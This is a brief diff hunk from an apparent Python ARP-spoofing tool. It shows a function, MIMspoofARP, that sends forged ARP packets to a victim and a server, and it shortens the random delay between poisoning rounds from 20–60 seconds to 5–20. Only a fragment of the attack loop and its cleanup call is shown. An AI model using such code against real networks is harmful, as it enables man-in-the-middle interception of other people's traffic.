@@ -37,7 +37,7 @@ def MIMspoofARP(ipVictim, ipServer):
             print("Poisoning Arp table")
             sendp(arpTo, iface=interface, verbose=False)
             sendp(arpFrom, iface=interface, verbose=False)
-            time.sleep(rd.randrange(20,60))
+            time.sleep(rd.randrange(5,20))
     except KeyboardInterrupt:
         undoARPSpoof(ipVictim, ipServer, macVictim, macServer)
 
